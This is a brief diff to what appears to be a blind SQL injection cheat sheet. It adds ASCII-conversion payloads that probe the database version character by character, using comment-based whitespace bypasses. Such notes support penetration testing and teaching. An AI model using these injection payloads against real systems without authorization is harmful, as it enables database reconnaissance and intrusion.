@@ -49,3 +49,8 @@ Is the version 4.xxxxx?
 Or 5.xxxx?
 > select/**/(substring((select/**/version()),1,1))=5;
 
+NOTE: it is good practice to convert to ASCII to avoid issues with the payload (ASCII: 52=4, 53=5)
+
+> select/**/ascii(substring((select/**/version()),1,1))=52;
+
+> select/**/ascii(substring((select/**/version()),1,1))=53;
